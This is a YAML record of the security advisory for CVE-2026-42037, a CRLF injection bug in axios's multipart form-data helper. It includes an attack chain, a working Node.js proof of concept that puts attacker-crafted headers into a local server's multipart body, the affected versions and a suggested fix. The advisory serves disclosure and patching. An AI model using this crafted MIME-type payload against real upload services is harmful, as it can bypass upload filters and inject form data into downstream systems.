@@ -1,0 +1,209 @@
+advisory_id: GHSA-445q-vr5w-6q77
+datasource_id: github_osv/GHSA-445q-vr5w-6q77
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-445q-vr5w-6q77/GHSA-445q-vr5w-6q77.json
+aliases:
+  - CVE-2026-42037
+summary: |
+  Axios: CRLF Injection in multipart/form-data body via unsanitized blob.type in formDataToStream
+  ### Summary
+  The `FormDataPart` constructor in `lib/helpers/formDataToStream.js` interpolates `value.type` directly into the `Content-Type` header of each multipart part without sanitizing CRLF (`\r\n`) sequences. An attacker who controls the `.type` property of a Blob/File-like object (e.g., via a user-uploaded file in a Node.js proxy service) can inject arbitrary MIME part headers into the multipart form-data body. This bypasses Node.js v18+ built-in header protections because the injection targets the multipart body structure, not HTTP request headers.
+
+  ### Details
+  In `lib/helpers/formDataToStream.js` at line 27, when processing a Blob/File-like value, the code builds per-part headers by directly embedding value.type:
+  ```
+  if (isStringValue) {
+    value = textEncoder.encode(String(value).replace(/\r?\n|\r\n?/g, CRLF));
+  } else {
+    // value.type is NOT sanitized for CRLF sequences
+    headers += `Content-Type: ${value.type || 'application/octet-stream'}${CRLF}`;
+  }
+  ```
+  Note that the string path (line above) explicitly sanitizes CRLF, but the binary/blob path does not. This inconsistency confirms the sanitization was intended but missed for `value.type`.
+
+
+  ### Attack chain:
+
+  1. Attacker uploads a file to a Node.js proxy service, supplying a crafted MIME type containing `\r\n` sequences
+  2. The proxy appends the file to a FormData and posts it via `axios.post(url, formData)`
+  3. axios calls `formDataToStream()`, which passes `value.type` unsanitized into the multipart body
+  4. The downstream server receives a multipart body containing injected per-part headers
+  5. The server's multipart parser processes the injected headers as legitimate
+
+  This is reachable via the fully public axios API (`axios.post(url, formData)`) with no special configuration.
+  Additionally, `value.name` used in the `Content-Disposition` construction nearby likely has the same issue and should be audited.
+
+  ### PoC
+  **Prerequisites**: Node.js 18+, axios (tested on 1.14.0)
+  ```
+  const http = require('http');
+  const axios = require('axios');
+
+  let receivedBody = '';
+
+  const server = http.createServer((req, res) => {
+    let body = '';
+    req.on('data', chunk => { body += chunk.toString(); });
+    req.on('end', () => {
+      receivedBody = body;
+      res.writeHead(200);
+      res.end('ok');
+    });
+  });
+
+  server.listen(0, '127.0.0.1', async () => {
+    const port = server.address().port;
+
+    class SpecFormData {
+      constructor() {
+        this._entries = [];
+        this[Symbol.toStringTag] = 'FormData';
+      }
+      append(name, value) { this._entries.push([name, value]); }
+      [Symbol.iterator]() { return this._entries[Symbol.iterator](); }
+      entries() { return this._entries[Symbol.iterator](); }
+    }
+
+    const fd = new SpecFormData();
+
+    fd.append('photo', {
+      type: 'image/jpeg\r\nX-Injected-Header: PWNED-by-attacker\r\nX-Evil: arbitrary-value',
+      size: 16,
+      name: 'photo.jpg',
+      [Symbol.asyncIterator]: async function*() {
+        yield Buffer.from('MALICIOUS PAYLOAD');
+      }
+    });
+
+    await axios.post(`http://127.0.0.1:${port}/upload`, fd);
+
+    if (receivedBody.includes('X-Injected-Header: PWNED-by-attacker')) {
+      console.log('[VULNERABLE] CRLF injection confirmed in multipart body');
+      console.log('Received body:\n' + receivedBody);
+    } else {
+      console.log('[NOT_VULNERABLE]');
+    }
+
+    server.close();
+  });
+  ```
+
+  ### Steps to reproduce:
+
+  1. npm install axios
+  2. Save the above as poc_axios_crlf.js
+  3. Run node poc_axios_crlf.js
+  4. Observe the output shows [VULNERABLE] with injected headers visible in the multipart body
+
+  **Expected behavior**: value.type should be sanitized to strip \r\n before interpolation, consistent with the string value path.
+  **Actual behavior**: CRLF sequences in value.type are preserved, allowing arbitrary header injection in multipart parts.
+
+  ### Impact
+  Any Node.js application that accepts user-provided files (with attacker-controlled MIME types) and re-posts them via axios FormData is affected. This is a common pattern in proxy services, file upload relays, and API gateways.
+  Consequences include: bypassing server-side Content-Type-based upload filters, confusing multipart parsers into misrouting data, injecting phantom form fields if the boundary is known, and exploiting downstream server vulnerabilities that trust per-part headers.
+  axios is one of the most downloaded npm packages, significantly increasing the blast radius of this issue.
+
+  ### Suggested fix
+  In formDataToStream.js, sanitize value.type before interpolating it into the per-part Content-Type header. Apply the same strategy used for string values (strip/replace \r\n) or use the same escapeName logic.
+  ```
+  const safeType = (value.type || 'application/octet-stream')
+    .replace(/[\r\n]/g, '');
+  headers += `Content-Type: ${safeType}${CRLF}`;
+  ```
+impacted_packages:
+  - purl: pkg:npm/axios
+    affected_versions: vers:npm/>=1.0.0|<1.15.1
+    fixed_versions: vers:npm/1.15.1
+    affected_packages:
+      - pkg:npm/axios@1.0.0
+      - pkg:npm/axios@1.1.0
+      - pkg:npm/axios@1.1.1
+      - pkg:npm/axios@1.1.2
+      - pkg:npm/axios@1.1.3
+      - pkg:npm/axios@1.2.0-alpha.1
+      - pkg:npm/axios@1.2.0
+      - pkg:npm/axios@1.2.1
+      - pkg:npm/axios@1.2.2
+      - pkg:npm/axios@1.2.3
+      - pkg:npm/axios@1.2.4
+      - pkg:npm/axios@1.2.5
+      - pkg:npm/axios@1.2.6
+      - pkg:npm/axios@1.3.0
+      - pkg:npm/axios@1.3.1
+      - pkg:npm/axios@1.3.2
+      - pkg:npm/axios@1.3.3
+      - pkg:npm/axios@1.3.4
+      - pkg:npm/axios@1.3.5
+      - pkg:npm/axios@1.3.6
+      - pkg:npm/axios@1.4.0
+      - pkg:npm/axios@1.5.0
+      - pkg:npm/axios@1.5.1
+      - pkg:npm/axios@1.6.0
+      - pkg:npm/axios@1.6.1
+      - pkg:npm/axios@1.6.2
+      - pkg:npm/axios@1.6.3
+      - pkg:npm/axios@1.6.4
+      - pkg:npm/axios@1.6.5
+      - pkg:npm/axios@1.6.6
+      - pkg:npm/axios@1.6.7
+      - pkg:npm/axios@1.6.8
+      - pkg:npm/axios@1.7.0-beta.0
+      - pkg:npm/axios@1.7.0-beta.1
+      - pkg:npm/axios@1.7.0-beta.2
+      - pkg:npm/axios@1.7.0
+      - pkg:npm/axios@1.7.1
+      - pkg:npm/axios@1.7.2
+      - pkg:npm/axios@1.7.3
+      - pkg:npm/axios@1.7.4
+      - pkg:npm/axios@1.7.5
+      - pkg:npm/axios@1.7.6
+      - pkg:npm/axios@1.7.7
+      - pkg:npm/axios@1.7.8
+      - pkg:npm/axios@1.7.9
+      - pkg:npm/axios@1.8.0
+      - pkg:npm/axios@1.8.1
+      - pkg:npm/axios@1.8.2
+      - pkg:npm/axios@1.8.3
+      - pkg:npm/axios@1.8.4
+      - pkg:npm/axios@1.9.0
+      - pkg:npm/axios@1.10.0
+      - pkg:npm/axios@1.11.0
+      - pkg:npm/axios@1.12.0
+      - pkg:npm/axios@1.12.1
+      - pkg:npm/axios@1.12.2
+      - pkg:npm/axios@1.13.0
+      - pkg:npm/axios@1.13.1
+      - pkg:npm/axios@1.13.2
+      - pkg:npm/axios@1.13.3
+      - pkg:npm/axios@1.13.4
+      - pkg:npm/axios@1.13.5
+      - pkg:npm/axios@1.13.6
+      - pkg:npm/axios@1.14.0
+      - pkg:npm/axios@1.15.0
+    fixed_packages:
+      - pkg:npm/axios@1.15.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-445q-vr5w-6q77/GHSA-445q-vr5w-6q77.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-93
+references:
+  - url: https://github.com/axios/axios
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42037
+    reference_type:
+    reference_id: CVE-2026-42037
+  - url: https://github.com/axios/axios/security/advisories/GHSA-445q-vr5w-6q77
+    reference_type:
+    reference_id: GHSA-445q-vr5w-6q77
+exploits: []
